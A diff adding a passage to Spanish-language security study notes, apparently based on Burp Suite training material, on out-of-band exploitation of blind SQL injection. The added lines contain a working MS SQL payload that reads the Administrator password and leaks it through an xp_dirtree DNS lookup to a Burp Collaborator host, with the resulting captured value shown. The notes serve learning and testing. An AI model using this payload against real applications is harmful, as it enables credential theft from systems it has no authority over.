@@ -274,6 +274,13 @@ Pues estamos en Oracle. Esto eso una entidad XML externa que todavia no vimos.
 Tambien hay que seleccionar todo y poner Control+U para encodear la url.  
 Luego en Collaborator deberia aparecer A o AAAA, lo que significaria que puede que sea vulnerable... algo asi.
 
+Habiendo confirmado una forma de desencadenar interacciones out-of-band, podemos usar el canal out-of-band para exfiltrar datos de la aplicación vulnerable. Por ejemplo:  
+`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`  
+Esta input lee la contrasenia del usuario Administrador, anexiona un subdominio Collaborator unico y desencadena un DNS lookup. Este lookup permite ver la contrasenia capturada:  
+`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`  
+Las tecnicas Out-of-band (OAST (Out of band Application Security Testing)) son una muy poderosa forma de detectar y explotar vulnerabilidades de inyeccion SQL ciega, dada la alta chance de exito y la posibilidad de exfiltrar datos de forma directa mediante el canal out-of-band. Por esta razon, las tecnicas OAST son usualmente preferibles incluso en situaciones en las que otras tecnicas para explotar vulnerabilidades ciegas podrian funcionar.  
+#Nota: hay varias formas de provocar una interaccion out-of-band, y tecnicas diferentes aplican en diferentes tipos de bases de datos.
+
 ## John the Ripper
 
 (TBD - Información por agregar)
